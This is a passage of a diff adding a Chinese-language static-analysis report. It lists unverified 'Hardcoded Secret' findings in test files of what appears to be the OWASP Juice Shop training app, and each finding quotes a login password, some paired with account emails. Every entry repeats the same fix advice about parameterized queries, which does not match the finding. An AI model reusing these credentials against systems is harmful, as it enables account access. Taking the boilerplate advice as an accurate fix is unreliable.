+  <p class="meta">
+    test/api/delivery.test.ts:54　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.107 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/delivery.test.ts:82　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.108 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/delivery.test.ts:115　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.109 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/deluxe.test.ts:25　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;OhG0dPlease1nsertLiquor!&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.110 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/deluxe.test.ts:40　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.111 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/deluxe.test.ts:55　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;admin123&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.112 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/deluxe.test.ts:70　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;i am an awesome accountant&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.113 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/deluxe.test.ts:85　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;OhG0dPlease1nsertLiquor!&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.114 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/deluxe.test.ts:110　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;Mr. N00dles&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.115 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/deluxe.test.ts:128　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;K1f.....................&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.116 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/deluxe.test.ts:146　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.117 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/deluxe.test.ts:165　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.118 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/deluxe.test.ts:183　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;admin123&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.119 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/deluxe.test.ts:201　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;i am an awesome accountant&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.120 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/erasure-request.test.ts:22　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const { token } = await login(app, { email: &#39;bjoern@owasp.org&#39;, password: &#39;kitten lesser pooch karate buffoon indoors&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.121 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/erasure-request.test.ts:34　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const { token } = await login(app, { email: &#39;bjoern.kimminich@gmail.com&#39;, password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.122 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/erasure-request.test.ts:53　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const { token } = await login(app, { email: &#39;bjoern.kimminich@gmail.com&#39;, password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.123 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/erasure-request.test.ts:66　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>.send({ email: &#39;bjoern.kimminich@gmail.com&#39;, password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.124 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/erasure-request.test.ts:80　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const { token } = await login(app, { email: &#39;bjoern.kimminich@gmail.com&#39;, password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.125 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/erasure-request.test.ts:91　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const { token } = await login(app, { email: &#39;bjoern.kimminich@gmail.com&#39;, password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.126 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/erasure-request.test.ts:103　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const { token } = await login(app, { email: &#39;bjoern.kimminich@gmail.com&#39;, password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.127 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/feedback.test.ts:117　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.128 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/feedback.test.ts:143　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.129 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/login.test.ts:27　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;kallliiii&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.130 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/login.test.ts:36　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;kallliiii&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.131 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/login.test.ts:52　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ooootto&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.132 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/login.test.ts:76　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;admin123&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.133 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/login.test.ts:90　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.134 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/login.test.ts:104　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;Mr. N00dles&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.135 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/login.test.ts:118　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;K1f.....................&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.136 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/login.test.ts:132　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;EinBelegtesBrotMitSchinkenSCHINKEN!&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.137 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/login.test.ts:147　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.138 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/login.test.ts:245　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.139 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/login.test.ts:267　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.140 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/memory.test.ts:32　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.141 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/memory.test.ts:53　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.142 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/memory.test.ts:66　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.143 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/memory.test.ts:78　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.144 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/memory.test.ts:93　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.145 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/order-history.test.ts:25　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;admin123&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.146 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/order-history.test.ts:56　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.147 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/order-history.test.ts:69　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;admin123&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.148 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/order-history.test.ts:82　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;i am an awesome accountant&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.149 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/order-history.test.ts:97　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;admin123&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.150 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/order-history.test.ts:111　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.151 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/order-history.test.ts:125　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;i am an awesome accountant&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.152 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/password.test.ts:28　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;kunigunde&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.153 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/password.test.ts:32　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const { token } = await login(app, { email: &#39;kuni@be.rt&#39;, password: &#39;kunigunde&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.154 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/password.test.ts:44　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;monkey summer birthday are all bad passwords but work just fine in a long passphrase&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.155 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/password.test.ts:95　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;OhG0dPlease1nsertLiquor!&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.156 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/payment.test.ts:20　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const { token } = await login(app, { email: &#39;jim@juice-sh.op&#39;, password: &#39;ncc-1701&#39; })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.157 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/product-review.test.ts:101　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.158 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/product-review.test.ts:115　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.159 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/profile-image-upload.test.ts:31　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.160 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/profile-image-upload.test.ts:48　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.161 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/profile-image-upload.test.ts:77　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.162 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/profile-image-upload.test.ts:95　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.163 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/profile-image-upload.test.ts:110　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.164 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/profile-image-upload.test.ts:137　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.165 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/profile-image-upload.test.ts:161　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.166 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/quantity.test.ts:25　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.167 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/quantity.test.ts:37　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;admin123&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.168 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/quantity.test.ts:49　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;i am an awesome accountant&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.169 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/quantity.test.ts:61　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.170 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/quantity.test.ts:74　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;admin123&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.171 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/quantity.test.ts:87　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;i am an awesome accountant&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.172 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/quantity.test.ts:102　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>password: &#39;ncc-1701&#39;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.173 Hardcoded Secret <span class="badge high">HIGH</span></h3>
+  <p class="meta">
+    test/api/quantity.test.ts:115　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
